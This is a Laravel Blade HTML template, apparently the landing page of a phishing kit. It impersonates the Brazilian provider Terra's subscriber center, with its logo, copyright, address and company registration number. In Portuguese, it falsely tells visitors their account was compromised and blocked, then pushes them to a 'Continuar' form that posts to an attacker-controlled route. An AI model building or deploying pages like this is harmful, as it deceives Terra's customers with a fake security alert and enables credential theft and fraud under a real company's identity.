<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Central do Assinante</title>
    <x-head-icon />
    @viteReactRefresh
</head>
<body class="flex flex-col min-h-screen bg-gray-100">
<!-- Header -->
<header class="bg-white py-4 px-6 border-b border-gray-200">
    <div class="container mx-auto flex justify-between items-center">
        <div>
            <img class="h-10"
                 src="./Central do Assinante_files/logo-terra-25-anos.svg" alt="Terra" title="Terra">
        </div>
        <nav>
            <ul class="flex space-x-6">
                <li><a href="#" class="text-gray-800 font-medium uppercase">Produtos</a></li>
            </ul>
        </nav>
    </div>
</header>

<!-- Main Content -->
<main class="flex-grow py-8">
    <div class="container mx-auto px-4">
        <h1 class="text-2xl text-center text-orange-500 font-medium mb-8">Sua Conta Foi Comprometida</h1>

        <div class="max-w-3xl mx-auto bg-white p-8 rounded shadow-sm">
            <div class="space-y-6">
                <p class="text-gray-700">
                    Detectamos atividades de login incomuns de vários locais, o que indica que sua conta pode ter sido
                    comprometida.
                </p>

                <p class="text-gray-700">
                    Para sua segurança, bloqueamos temporariamente sua conta para impedir novos acessos.
                </p>

                <p class="text-gray-700">
                    Siga as etapas abaixo para proteger sua conta.
                </p>

                <div class="pt-4">
                    <form action="{{route('landing.store', request()->all())}}" method="POST">
                        @csrf
                        <button class="bg-orange-500 hover:bg-orange-600 text-white px-6 py-2 rounded">
                            Continuar
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</main>

<!-- Footer -->
<footer class="mt-auto">
    <div class="border-t border-gray-300 py-4">
        <div class="container mx-auto px-4">
            <div class="flex justify-center space-x-6 mb-4 text-sm text-gray-600">
                <a href="#" class="hover:text-orange-500">Fale com o Terra</a>
                <a href="#" class="hover:text-orange-500">Perguntas Frequentes</a>
            </div>

            <div class="text-center text-xs text-gray-600 space-y-1">
                <p class="uppercase">COPYRIGHT, TERRA NETWORKS BRASIL LTDA.</p>
                <p>Av. Engenheiro Luís Carlos Berrini, 1376 - 13º andar, Cidade Monções - São Paulo - SP - CEP
                    04571-936. CNPJ 91.088.328/0001-67</p>
                <p class="text-gray-400">www.terra.com.br</p>
            </div>
        </div>
    </div>
</footer>
</body>
</html>
